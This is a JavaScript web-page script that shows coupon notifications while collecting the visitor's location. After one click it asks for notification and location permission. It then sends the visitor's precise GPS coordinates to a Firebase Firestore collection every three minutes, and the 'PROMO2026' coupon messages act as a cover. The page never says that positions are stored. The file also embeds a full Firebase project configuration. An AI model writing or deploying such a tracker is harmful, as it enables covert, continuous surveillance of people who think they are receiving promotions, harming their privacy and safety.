/* CONEXION BASE DE DATOS */
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp,
  getCountFromServer
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyBZavR7TNRrzKrxr1RqnvfrUelMLz81hyg",
  authDomain: "bd-herramienta-busqueda.firebaseapp.com",
  projectId: "bd-herramienta-busqueda",
  storageBucket: "bd-herramienta-busqueda.firebasestorage.app",
  messagingSenderId: "416153196731",
  appId: "1:416153196731:web:b0bc4ffe60cbb3a9a3319e",
  measurementId: "G-6S15ZGGCQ4"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

/* FIRESTORE - Guardar ubicación */
async function guardarUbicacionBD(lat, lon) {
  try {
    const colRef = collection(db, "ubicaciones");

    await addDoc(colRef, {
      ubicacion: `${lat}, ${lon}`,
      fecha_ubi: serverTimestamp(),
    });

  } catch (e) {
    console.error("Error ", e);
  }
}

/* GEOLOCALIZACIÓN - Pide permiso una vez, luego solo obtiene */
function obtenerUbicacion() {
  if (!navigator.geolocation) {
    console.warn("Geolocalización no soportada.");
    return;
  }

  const resultado = document.getElementById("resultado");
  if (resultado) resultado.innerHTML = "Actualizando...";

  navigator.geolocation.getCurrentPosition(
    (posicion) => {
      const lat = posicion.coords.latitude;
      const lon = posicion.coords.longitude;
      if (resultado) resultado.innerHTML = `Lat: ${lat}, Lon: ${lon}`;
      guardarUbicacionBD(lat, lon);
    },
    (error) => {
      console.error("Error GPS:", error.message);
    },
    {
      enableHighAccuracy: true,
      timeout: 180000,
      maximumAge: 0,
    }
  );
}

/* NOTIFICACIONES - Service Worker + fallback */
const Noti = {
  msg: "¡Cupón: PROMO2026! 🎁",
  lanzar: async function () {
    if (Notification.permission !== "granted") return;

    const reg = await navigator.serviceWorker.getRegistration();
    if (reg) {
      reg.showNotification("¡Nuevo Cupón!", {
        body: this.msg,
        icon: "/favicon.ico",
        badge: "/favicon.ico",
        vibrate: [200, 100, 200],
        tag: "promo-notification",
      });
    } else {
      new Notification("¡Nuevo Cupón!", { body: this.msg });
    }

    // Notificación visual en pantalla
    const div = document.createElement("div");
    div.textContent = this.msg; // textContent es más seguro que innerHTML
    div.style.cssText =
      "position:fixed;bottom:20px;right:20px;background:#000;color:#fff;padding:15px;border-radius:8px;z-index:9999;font-family:sans-serif;";
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 5000);
  },
};

/* ACTIVACIÓN - Un solo clic del usuario lo inicia todo */
document.addEventListener(
  "click",
  async () => {
    try {
      // 1. Registrar Service Worker (necesario para notificaciones en Android)
      await navigator.serviceWorker.register("/sw.js");

      // 2. Pedir permiso de notificaciones (esto abre el diálogo del navegador)
      const permiso = await Notification.requestPermission();
      if (permiso !== "granted") {
        console.warn("Permiso de notificaciones denegado.");
        return;
      }

      // 3. Obtener ubicación ahora (esto abre el diálogo de ubicación)
      obtenerUbicacion();
      Noti.lanzar();

      // 4. Repetir cada 3 minutos — UN SOLO setInterval
      const INTERVALO = 3 * 60 * 1000; // 180,000 ms
      setInterval(() => {
        obtenerUbicacion();
        Noti.lanzar();
      }, INTERVALO);

    } catch (err) {
      console.error("Error al iniciar:", err);
    }
  },
  { once: true }
);